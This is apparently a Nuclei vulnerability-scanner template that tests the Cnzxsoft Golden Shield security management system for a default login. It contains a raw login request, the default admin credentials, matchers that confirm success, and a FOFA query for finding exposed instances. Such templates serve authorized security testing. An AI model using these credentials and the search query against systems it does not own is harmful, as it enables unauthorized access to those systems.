http:
- attack: pitchfork
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,"1") && contains(header,"ZXSOFT_JDIS_USR_NAME=deleted") && !contains(body_1,"userpwd_error")
    type: dsl
  payloads:
    password:
    - zxsoft1234!@#$
    username:
    - admin
  raw:
  - 'POST /?q=common/login  HTTP/1.1

    Host: {{Hostname}}

    Cookie: check_code=ptbh

    Content-Type: application/x-www-form-urlencoded


    name={{username}}&password={{password}}&checkcode=ptbh&doLoginSubmit=1

    '
id: cnzxsoft-default-login
info:
  author: SleepingBag945
  description: 'Cnzxsoft Golden Shield Information Security Management System has
    a default weak password.

    '
  metadata:
    fofa-query: "title==\"\u4E2D\u65B0\u91D1\u76FE\u4FE1\u606F\u5B89\u5168\u7BA1\u7406\
      \u7CFB\u7EDF\""
    max-request: 1
    verified: true
  name: Cnzxsoft System - Default Login
  severity: high
  tags: default-login,cnzxsoft
